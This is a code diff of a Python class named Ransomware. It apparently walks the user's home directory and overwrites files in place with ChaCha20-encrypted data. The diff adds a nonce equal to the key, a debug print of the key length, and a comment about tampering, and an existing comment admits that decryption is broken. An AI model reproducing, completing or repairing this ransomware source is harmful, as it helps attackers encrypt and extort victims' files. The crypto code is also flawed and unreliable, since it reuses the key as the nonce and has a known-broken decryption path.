@@ -9,6 +9,8 @@ import os                                       # Os.walk function
 from os.path import expanduser                  # Expand user home
 
 
+# XXX: As ChaCha20 does not verify the integrity of data, an attacker may
+# manipulate it's content before decryption, to avoid this use ChaCha20_Poly1305
 # FIXME: Decryption is not properly working, you can't use the same object of
 # encryption for decryption, as mentioned in https://stackoverflow.com/a/54082879
 
@@ -60,7 +62,8 @@ class Ransomware:
     # Read key for decryption
     def read_key(self, key):
         self.key = base64.b64decode(key.encode())
-        self.cryptor = ChaCha20.new(key=self.key)
+        print(len(self.key))
+        self.cryptor = ChaCha20.new(key=self.key, nonce=self.key)
 
     # Save key into external file
     def write_key(self):
@@ -79,9 +82,7 @@ class Ransomware:
     def encrypt(self, file, encrypted):
         with open(file, 'rb+') as fin:
             _data = fin.read()
-
             data = self.cryptor.decrypt(_data) if encrypted else self.cryptor.encrypt(_data)
-
             fin.seek(0)
             return fin.write(data)
 
